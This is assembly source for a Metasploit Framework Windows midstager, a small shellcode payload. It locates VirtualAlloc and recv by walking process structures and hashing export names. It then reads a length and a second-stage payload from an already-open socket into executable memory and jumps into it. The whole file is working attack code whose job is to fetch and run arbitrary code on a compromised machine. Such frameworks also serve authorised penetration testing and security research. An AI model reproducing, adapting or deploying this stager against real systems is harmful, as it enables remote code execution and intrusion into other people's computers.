;
; Metasploit Framework
; http://www.metasploit.com
;
; Source for the windows midstager
;
; Origional Authors: ?
; This patch: Stephen Fewer <info@harmonysecurity.com>
; Size: 191
;
; This midstager performs the following actions...
;
;   // get address's for ws2_32!recv and kernel32!VirtualAlloc ...
;   recv( socket, &dwSize, 4, 0 );
;   pNextStage = VirtualAlloc( NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
;   do
;   {
;       dwBytesRecieved = recv( socket, pNextStage, dwSize, 0 );
;       pNextStage += dwBytesRecieved
;       dwSize -= dwBytesRecieved
;   } while( dwSize != 0 );
;   // execute the next stage ...
;
; assemble with: >nasm -o midstager.bin midstager.asm

[BITS 32]

global _start

_start:
	cld
	xor ebx, ebx
	mov eax, [fs:ebx+0x30]
	mov eax, [eax+0xc]
	mov edx, [eax+0x1C]
	mov edx, [edx]
	mov esi, [edx+0x20]
	lodsd
	lodsd
	dec esi
	add eax, [esi]
	cmp eax, 0x325F3332
	jnz 0x0D
	mov ebp, [edx+0x8]
	mov eax, [ebp+0x3c]
	mov ecx, [ebp+eax+0x78]
	mov ecx, [ebp+ecx+0x1C]
	add ecx, ebp
	mov esi, [ecx+0x3C]
	add esi, ebp
	pushad
	mov eax, [fs:0x30] ; parse the kernels export table for VirtualAlloc
	mov eax, [eax+0xc]
	mov esi, [eax+0x1C]
	lodsd
	mov ebp, [eax+0x8]
	mov eax, [ebp+0x3C]
	mov edi, [ebp+eax+0x78]
	add edi, ebp
	mov ecx, [edi+0x18]
	mov ebx, [edi+0x20]
	add ebx, ebp
next_entry:
	dec ecx
	mov esi, [ebx+ecx*4]
	add esi, ebp
	xor eax, eax
	cdq
next_byte:
	lodsb
	test al, al
	jz hash_complete
	ror edx, 0x0D
	add edx, eax
	jmp short next_byte
hash_complete:
	cmp edx, 0x91AFCA54 ; check if we have VirtualAlloc
	jnz next_entry
	mov ebx, [edi+0x24]
	add ebx, ebp
	mov cx, [ebx+ecx*2]
	mov ebx, [edi+0x1C]
	add ebx, ebp
	mov ebx, [ebx+ecx*4]
	add ebx, ebp
	mov [esp+0x8], ebx  ; patch saved ebp = VirtualAlloc
	popad               ; pop all saved registers back
	mov ebx, esp        ; ebx = pointer to our 4 byte buffer on the stack
	push byte +0x0      ; flags
	push byte +0x4      ; size = 4 bytes
	push ebx            ; buffer address
	push edi            ; socket
	call esi            ; recv( socket, &buffer, 4, 0 )
	mov ebx, [ebx]      ; dereference our size pointer
	push 0x40           ; PAGE_EXECUTE_READWRITE
	push 0x3000         ; MEM_COMMIT | MEM_RESERVE
	push ebx            ; size
	push 0x00000000     ; null
	call ebp            ; VirtualAlloc( NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE )
	mov ebp, eax        ; ebp = our new memory address for the new stage
	push ebp            ; push the address of the new stage so we can return into it
read_more:
	push byte +0x0      ; flags
	push ebx            ; size
	push ebp            ; pBuffer
	push edi            ; socket
	call esi            ; recv( socket, pBuffer, length, 0 )
	add ebp, eax        ; pBuffer += bytes_received
	sub ebx, eax        ; length -= bytes_received
	test ebx, ebx       ; test length
	jnz read_more       ; continue if we have more to read
	ret                 ; return into new stage
